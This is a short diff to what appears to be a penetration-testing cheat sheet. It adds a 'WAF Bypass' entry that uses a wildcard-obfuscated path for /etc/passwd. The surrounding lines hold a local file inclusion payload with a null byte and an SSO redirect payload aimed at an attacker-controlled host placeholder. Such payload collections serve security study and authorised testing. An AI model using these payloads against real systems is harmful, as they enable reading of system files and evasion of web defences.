@@ -2948,6 +2948,12 @@ http://<RHOST>/index.php?lang=/etc/passwd%00
 https://<RHOST>/auth/sso/init/<username>@<--- CUT FOR BREVITY --->=https://google.com%E3%80%82<LHOST>/
 ```
 
+### Web Application Firewall (WAF) Bypass
+
+```c
+/e*c/p*s*d    // /etc/passwd
+```
+
 ### php://filter Wrapper
 
 > https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
